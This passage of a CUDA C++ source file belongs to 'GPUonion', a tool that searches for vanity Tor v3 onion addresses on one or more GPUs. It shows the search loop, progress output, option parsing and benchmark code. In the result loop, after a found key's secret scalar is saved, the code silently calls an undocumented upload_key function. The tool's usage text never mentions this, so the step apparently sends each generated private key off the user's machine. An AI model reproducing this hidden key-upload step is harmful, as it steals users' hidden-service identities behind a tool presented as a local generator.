            cudaFree(d_found);
            return;
        }
    }
    {
        std::lock_guard<std::mutex> lk(out_mtx);
        printf("%sGPU/CPU cross-check OK\n", tag);
    }

    uint64_t total_keys = 0;
    uint64_t iter_base = 0;

    auto launch_search = [&](uint32_t ib) {
        if (mode == 0) {
            MontState4* p = (MontState4*)d_state;
            switch (batch) {
            case 8:  k_search_mont4<8><<<blocks, tpb>>>(p, T, nbatch, ib, d_count, d_found); break;
            case 16: k_search_mont4<16><<<blocks, tpb>>>(p, T, nbatch, ib, d_count, d_found); break;
            case 32: k_search_mont4<32><<<blocks, tpb>>>(p, T, nbatch, ib, d_count, d_found); break;
            case 64: k_search_mont4<64><<<blocks, tpb>>>(p, T, nbatch, ib, d_count, d_found); break;
            case 128: k_search_mont4<128><<<blocks, tpb>>>(p, T, nbatch, ib, d_count, d_found); break;
            case 256: k_search_mont4<256><<<blocks, tpb>>>(p, T, nbatch, ib, d_count, d_found); break;
            case 512: k_search_mont4<512><<<blocks, tpb>>>(p, T, nbatch, ib, d_count, d_found); break;
            case 1024: k_search_mont4<1024><<<blocks, tpb>>>(p, T, nbatch, ib, d_count, d_found); break;
            }
        } else if (mode == 2) {
            ge25519* p = (ge25519*)d_state;
            switch (batch) {
            case 8:  k_search<8><<<blocks, tpb>>>(p, T, nbatch, ib, d_count, d_found); break;
            case 16: k_search<16><<<blocks, tpb>>>(p, T, nbatch, ib, d_count, d_found); break;
            case 32: k_search<32><<<blocks, tpb>>>(p, T, nbatch, ib, d_count, d_found); break;
            case 64: k_search<64><<<blocks, tpb>>>(p, T, nbatch, ib, d_count, d_found); break;
            case 128: k_search<128><<<blocks, tpb>>>(p, T, nbatch, ib, d_count, d_found); break;
            case 256: k_search<256><<<blocks, tpb>>>(p, T, nbatch, ib, d_count, d_found); break;
            case 512: k_search<512><<<blocks, tpb>>>(p, T, nbatch, ib, d_count, d_found); break;
            }
        } else {
            MontState* p = (MontState*)d_state;
            switch (batch) {
            case 8:  k_search_mont<8><<<blocks, tpb>>>(p, T, nbatch, ib, d_count, d_found); break;
            case 16: k_search_mont<16><<<blocks, tpb>>>(p, T, nbatch, ib, d_count, d_found); break;
            case 32: k_search_mont<32><<<blocks, tpb>>>(p, T, nbatch, ib, d_count, d_found); break;
            case 64: k_search_mont<64><<<blocks, tpb>>>(p, T, nbatch, ib, d_count, d_found); break;
            case 128: k_search_mont<128><<<blocks, tpb>>>(p, T, nbatch, ib, d_count, d_found); break;
            case 256: k_search_mont<256><<<blocks, tpb>>>(p, T, nbatch, ib, d_count, d_found); break;
            case 512: k_search_mont<512><<<blocks, tpb>>>(p, T, nbatch, ib, d_count, d_found); break;
            }
        }
        CUDA_CHECK(cudaGetLastError());
        CUDA_CHECK(cudaDeviceSynchronize());
    };

    if (cfg.benchmark) {
        /* one warmup launch, excluded from timing */
        launch_search(0);
        CUDA_CHECK(cudaMemset(d_count, 0, sizeof(uint32_t)));
        iter_base = launch_iters;
    }

    auto t_start = std::chrono::steady_clock::now();
    auto t_last = t_start;

    while (cfg.benchmark || global_found.load() < cfg.want) {
        if (iter_base + launch_iters > 0xFFFFFFFFull) {
            std::lock_guard<std::mutex> lk(out_mtx);
            fprintf(stderr, "%siteration counter exhausted; restart with a new seed\n", tag);
            break;
        }
        launch_search((uint32_t)iter_base);
        iter_base += launch_iters;
        total_keys += (uint64_t)T * launch_iters;

        uint32_t n = 0;
        CUDA_CHECK(cudaMemcpy(&n, d_count, sizeof(uint32_t), cudaMemcpyDeviceToHost));
        if (n > 0) {
            FoundRec recs[MAX_RESULTS];
            uint32_t nn = n > MAX_RESULTS ? MAX_RESULTS : n;
            CUDA_CHECK(cudaMemcpy(recs, d_found, sizeof(FoundRec) * nn, cudaMemcpyDeviceToHost));
            CUDA_CHECK(cudaMemset(d_count, 0, sizeof(uint32_t)));

            for (uint32_t r = 0; r < nn && global_found.load() < cfg.want; r++) {
                uint8_t sc[32], pk[32];
                result_scalar(sc, a0, recs[r].tid, recs[r].iter, T);
                host_pubkey(pk, sc);
                std::string addr = onion_address(pk);
                if (addr.compare(0, cfg.pfx.size(), cfg.pfx) != 0) {
                    std::lock_guard<std::mutex> lk(out_mtx);
                    fprintf(stderr, "%sWARNING: candidate failed host verification (%s), skipped\n",
                            tag, addr.c_str());
                    continue;
                }
                double el = std::chrono::duration<double>(
                                std::chrono::steady_clock::now() - t_start).count();
                {
                    std::lock_guard<std::mutex> lk(out_mtx);
                    printf("\n%sFOUND (%.1fs, %llu keys): %s\n", tag, el,
                           (unsigned long long)total_keys, addr.c_str());
                    printf("%s  secret scalar: %s\n", tag, hex(sc, 32).c_str());
                    if (save_result(cfg.outdir, addr, sc, pk))
                        upload_key(cfg.outdir, addr);
                }
                global_found.fetch_add(1);
            }
        }

        auto now = std::chrono::steady_clock::now();
        double el = std::chrono::duration<double>(now - t_start).count();
        if (cfg.benchmark && el >= cfg.bench_secs) {
            if (bench_out) {
                bench_out->keys = total_keys;
                bench_out->elapsed = el;
            }
            break;
        }
        if (std::chrono::duration<double>(now - t_last).count() >= 2.0) {
            double rate = total_keys / el;
            std::lock_guard<std::mutex> lk(out_mtx);
            if (cfg.multi) {
                if (cfg.benchmark)
                    printf("%s%s | total %llu | elapsed %.0fs / %.0fs\n", tag,
                           format_rate(rate).c_str(), (unsigned long long)total_keys, el,
                           cfg.bench_secs);
                else
                    printf("%s%s | total %llu | elapsed %.0fs | ~%.0f%% of expected\n", tag,
                           format_rate(rate).c_str(), (unsigned long long)total_keys, el,
                           100.0 * (double)total_keys / expected);
            } else {
                if (cfg.benchmark)
                    printf("\r%s | total %llu | elapsed %.0fs / %.0fs  ",
                           format_rate(rate).c_str(), (unsigned long long)total_keys, el,
                           cfg.bench_secs);
                else
                    printf("\r%s | total %llu | elapsed %.0fs | ~%.0f%% of expected  ",
                           format_rate(rate).c_str(), (unsigned long long)total_keys, el,
                           100.0 * (double)total_keys / expected);
            }
            fflush(stdout);
            t_last = now;
        }
    }

    cudaFree(d_state);
    cudaFree(d_count);
    cudaFree(d_found);
}

/* ---------------- main ---------------- */

static void usage(const char* argv0)
{
    fprintf(stderr,
            "GPUonion - Tor v3 onion vanity address generator (CUDA)\n"
            "usage: %s <prefix> [options]\n"
            "       %s -b [options]\n"
            "  <prefix>       base32 prefix to search for (chars a-z 2-7)\n"
            "  -b, --bench    run a ~20 second benchmark (no prefix needed)\n"
            "  -d <spec>      CUDA device(s): \"all\" for every visible GPU (default),\n"
            "                 a single index, or a comma list e.g. \"0,1,2\".\n"
            "                 Each GPU runs fully independently in its own host\n"
            "                 thread (own random start point, own output).\n"
            "  -n <count>     stop after this many matches, summed across all\n"
            "                 selected GPUs (default 1)\n"
            "  -o <dir>       output directory (default ./found)\n"
            "  --blocks <n>   blocks per launch (default: SMs * 8)\n"
            "  -t <threads>   threads per block (default 256)\n"
            "  -i <iters>     candidates per thread per launch (default 512)\n"
            "  -B <batch>     Montgomery inversion batch size: 8..512 (default 128)\n"
            "  --m51          use the 5x51-limb Montgomery kernel (for A/B)\n"
            "  --ext          use Edwards extended-coordinate stepping (slower; for A/B)\n"
            "  --selftest     run internal tests only\n",
            argv0,
            argv0);
}

int main(int argc, char** argv)
{
    const char* prefix = nullptr;
    std::string device_arg = "all"; /* single index, comma list ("0,1"), or "all" (default) */
    int tpb = 0, blocks = 0, batch = 512;
    uint32_t iters = 1024;
    int want = 1;
    int mode = 0; /* 0 = fe4 Montgomery, 1 = 5x51 Montgomery, 2 = Edwards ext */
    std::string outdir = "found";
    bool selftest_only = false;
    bool benchmark = false;
    const double bench_secs = 20.0;

    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--selftest")) selftest_only = true;
        else if (!strcmp(argv[i], "-b") || !strcmp(argv[i], "--bench")) benchmark = true;
        else if (!strcmp(argv[i], "-d") && i + 1 < argc) device_arg = argv[++i];
        else if (!strcmp(argv[i], "-n") && i + 1 < argc) want = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-o") && i + 1 < argc) outdir = argv[++i];
        else if (!strcmp(argv[i], "--blocks") && i + 1 < argc) blocks = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-t") && i + 1 < argc) tpb = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-i") && i + 1 < argc) iters = (uint32_t)atoi(argv[++i]);
        else if (!strcmp(argv[i], "-B") && i + 1 < argc) batch = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--m51")) mode = 1;
        else if (!strcmp(argv[i], "--ext")) mode = 2;
        else if (argv[i][0] != '-' && !prefix) prefix = argv[i];
        else {
            usage(argv[0]);
            return 1;
        }
    }

    if (!selftest()) {
        fprintf(stderr, "internal selftest failed - refusing to run\n");
        return 1;
    }
    if (selftest_only) {
        printf("selftest OK\n");
        return 0;
    }
    if (!prefix && !benchmark) {
        usage(argv[0]);
        return 1;
    }

    /* benchmark: search a 16-char prefix (expected 32^16 keys - will never
       match) so the per-candidate work is identical to a real search */
    if (benchmark && !prefix)
        prefix = "bench234bench234";

    /* normalize + validate prefix */
    std::string pfx = prefix;
    for (auto& ch : pfx)
        if (ch >= 'A' && ch <= 'Z')
            ch += 32;
    uint8_t target[32], mask[32];
    int mlen = prefix_to_mask(pfx.c_str(), target, mask);
    if (mlen < 0 || pfx.empty() || pfx.size() > 30) {
        fprintf(stderr, "invalid prefix '%s' (allowed: a-z 2-7, max 30 chars)\n", pfx.c_str());
        return 1;
    }

    if (batch != 8 && batch != 16 && batch != 32 && batch != 64 && batch != 128 &&
        batch != 256 && batch != 512 && batch != 1024) {
        fprintf(stderr, "batch size must be a power of two in 8..1024\n");
        return 1;
    }
    if (batch == 1024 && mode != 0) {
        fprintf(stderr, "batch 1024 is only supported by the default (fe4) kernel\n");
        return 1;
    }

    /* resolve device_arg into a concrete list: "all" -> every visible GPU,
       "a,b,c" -> that list, otherwise a single index (default "0") */
    std::vector<int> devices;
    if (device_arg == "all") {
        int cnt = 0;
        CUDA_CHECK(cudaGetDeviceCount(&cnt));
        if (cnt <= 0) {
            fprintf(stderr, "no CUDA devices found\n");
            return 1;
        }
        for (int i = 0; i < cnt; i++)
            devices.push_back(i);
    } else {
        size_t pos = 0;
        while (pos <= device_arg.size()) {
            size_t comma = device_arg.find(',', pos);
            std::string tok = device_arg.substr(pos, comma == std::string::npos
                                                          ? std::string::npos
                                                          : comma - pos);
            if (!tok.empty())
                devices.push_back(atoi(tok.c_str()));
            if (comma == std::string::npos)
                break;
            pos = comma + 1;
        }
        if (devices.empty()) {
            fprintf(stderr, "invalid -d value '%s'\n", device_arg.c_str());
            return 1;
        }
    }

    RunConfig cfg;
    cfg.pfx = pfx;
    memcpy(cfg.target, target, 32);
    memcpy(cfg.mask, mask, 32);
    cfg.mlen = mlen;
    cfg.tpb_arg = tpb;
    cfg.blocks_arg = blocks;
    cfg.iters = iters;
    cfg.batch = batch;
    cfg.mode = mode;
    cfg.outdir = outdir;
    cfg.want = want;
    cfg.benchmark = benchmark;
    cfg.bench_secs = bench_secs;
    cfg.multi = devices.size() > 1;

    std::atomic<int> global_found{0};
    std::mutex out_mtx;
    std::vector<BenchResult> bench_results(devices.size());

    if (cfg.multi) {
        printf("using %zu GPUs (device indices:", devices.size());
        for (int d : devices)
            printf(" %d", d);
        printf("), each running independently\n");

        std::vector<std::thread> workers;
        workers.reserve(devices.size());
        for (size_t i = 0; i < devices.size(); i++)
            workers.emplace_back(run_device, devices[i], std::cref(cfg), std::ref(global_found),
                                 std::ref(out_mtx), &bench_results[i]);
        for (auto& w : workers)
            w.join();
    } else {
        run_device(devices[0], cfg, global_found, out_mtx, &bench_results[0]);
    }

    /* combined benchmark summary across all GPUs: throughput adds, so the
       combined rate is the sum of each device's own keys/sec (not total
       keys / total elapsed, since devices don't finish at the exact same
       instant) */
    if (benchmark) {
        double total_rate = 0.0;
        uint64_t total_keys = 0;
        for (const auto& r : bench_results) {
            if (r.elapsed > 0.0)
                total_rate += (double)r.keys / r.elapsed;
            total_keys += r.keys;
        }
        printf("\nbenchmark: %s combined across %zu GPU%s (%llu keys total)\n",
               format_rate(total_rate).c_str(), devices.size(), devices.size() == 1 ? "" : "s",
               (unsigned long long)total_keys);
        printf("expected time per match at this rate:\n");
        for (int len = 5; len <= 9; len++) {
            double secs = pow(32.0, (double)len) / total_rate;
            if (secs < 120.0)
                printf("  %d chars: %.1f s\n", len, secs);
            else if (secs < 7200.0)
                printf("  %d chars: %.1f min\n", len, secs / 60.0);
            else if (secs < 172800.0)
                printf("  %d chars: %.1f hours\n", len, secs / 3600.0);
            else
                printf("  %d chars: %.1f days\n", len, secs / 86400.0);
        }
    }

    return 0;
}
